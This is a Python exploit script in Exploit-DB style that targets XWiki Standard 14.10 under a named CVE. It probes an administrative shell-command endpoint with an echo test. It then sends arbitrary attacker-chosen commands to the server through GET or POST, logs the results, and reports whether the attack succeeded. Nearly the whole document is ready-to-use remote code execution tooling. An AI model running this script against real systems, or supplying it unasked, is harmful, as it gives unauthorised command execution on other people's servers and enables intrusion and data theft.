# Exploit Title: CVE-2023-48292 Remote Code Execution Exploit
# Google Dork: N/A
# Date: 23 March 2025
# Exploit Author: Mehran Seifalinia
# Vendor Homepage: https://www.xwiki.org/
# Software Link: https://www.xwiki.org/xwiki/bin/view/Download/
# Version: XWiki Standard 14.10
# Tested on: Ubuntu 20.04 LTS with OpenJDK 11
# CVE : CVE-2023-48292

from argparse import ArgumentParser
import sys
import logging
from requests import get, post, RequestException
import validators

# Constants
CVE_NAME = "CVE-2023-48292"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
}

# Configure logging
def setup_logging(logfile):
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    # Create a logging handler for console output
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

    # Create a logging handler for file output
    file_handler = logging.FileHandler(logfile)
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(file_handler)

def validate_url(url):
    """
    Validate the URL to ensure it has the correct format and starts with 'http://' or 'https://'.
    """
    if not validators.url(url):
        logging.error("Invalid target URL format. It must start with 'http://' or 'https://'.")
        sys.exit(1)
    return url.rstrip("/")

def check_vulnerability(target_url, method):
    """
    Check if the target URL is vulnerable to the CVE-2023-48292 vulnerability.
    We send a test payload and inspect the response to determine if the vulnerability exists.
    """
    try:
        # Test payload to check for vulnerability
        test_payload = "echo 'testtesttest1234'"  # Payload to execute a test command on the target system
        vulnerable_url = f"{target_url}/xwiki/bin/view/Admin/RunShellCommand?command={test_payload}"

        if method == "GET":
            response = get(vulnerable_url, headers=HEADERS)
        else:  # method == "POST"
            response = post(vulnerable_url, headers=HEADERS)

        if response.status_code == 200 and "testtesttest1234" in response.text:
            logging.info("Target is vulnerable! Command execution test succeeded.")
            return True
        else:
            logging.info("Target does not appear to be vulnerable.")
            return False
    except RequestException as error:
        logging.error(f"HTTP Request Error: {error}")
        sys.exit(1)

def perform_attack(target_url, payload, method):
    """
    Perform the attack by sending a custom payload to the vulnerable server.
    """
    try:
        logging.info(f"Attempting attack with payload: {payload}")
        vulnerable_url = f"{target_url}/xwiki/bin/view/Admin/RunShellCommand?command={payload}"

        if method == "GET":
            response = get(vulnerable_url, headers=HEADERS)
        else:  # method == "POST"
            response = post(vulnerable_url, headers=HEADERS)

        if response.status_code == 200:
            logging.info(f"Attack successful! Response: {response.text[:100]}...")  # Display a snippet of the response
        else:
            logging.warning("Attack attempt failed.")
    except RequestException as error:
        logging.error(f"HTTP Request Error: {error}")
        sys.exit(1)

def main():
    """
    Main function to parse command-line arguments, check for vulnerability, and optionally perform the attack.
    """
    parser = ArgumentParser(description=f"{CVE_NAME} Exploit Script")
    parser.add_argument("target", help="Target URL (e.g., https://vulnsite.com)")
    parser.add_argument("--exploit", action="store_true", help="Perform attack with a payload")
    parser.add_argument("--payload", default="echo 'testtesttest1234'", help="Custom payload for exploitation")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method to use (GET or POST)")
    parser.add_argument("--logfile", default="exploit.log", help="Log file to store results")
    args = parser.parse_args()

    # Set up logging to file and console
    setup_logging(args.logfile)

    # Validate the target URL
    target_url = validate_url(args.target)

    logging.info("Checking the target for vulnerability...")
    if check_vulnerability(target_url, args.method):
        if args.exploit:
            # Perform the attack with the provided payload
            perform_attack(target_url, args.payload, args.method)
        else:
            logging.info("Run with '--exploit' to attempt the attack.")
    else:
        logging.warning("The target is not vulnerable. Exiting.")

if __name__ == "__main__":
    main()